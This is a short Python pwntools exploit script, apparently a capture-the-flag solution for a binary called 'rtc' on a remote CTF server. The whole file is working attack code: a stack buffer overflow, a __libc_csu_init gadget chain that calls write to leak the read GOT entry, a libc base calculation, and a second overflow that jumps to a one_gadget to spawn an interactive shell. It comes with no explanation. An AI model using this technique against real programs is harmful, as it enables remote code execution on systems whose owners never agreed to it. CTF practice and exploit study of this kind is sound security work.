#!/usr/bin/python 
from pwn import *
#context.log_level= 'debug'

#p = process("./rtc", env={'LD_PRELOAD' : './libc.so.6'})
p = remote("ctf.j0n9hyun.xyz", 3025)
elf = ELF("./rtc")
libc = ELF("./libc.so.6")
write_got = elf.got['write']
read_got = elf.got['read']
main = 0x4005f6

rbx = 0
rbp = 1
r12 = write_got
r13 = 8
r14 = read_got
r15 = 1

pay = 'A'*(0x40 + 0x8) + p64(0x4006ba)
pay += p64(0) + p64(1) + p64(write_got) + p64(8) + p64(read_got) + p64(1) + p64(0x4006a0)
pay += 'A'*8*7 + p64(main)

#gdb.attach(p)

p.sendlineafter("\n", pay)

read = u64(p.recv(8))
libcBase = read - libc.symbols['read']
one_gadget = libcBase + 0xf02a4

pay = 'A'*(0x40+0x8) + p64(one_gadget) + '\x00'*0x100

p.sendlineafter("\n", pay)

p.interactive()
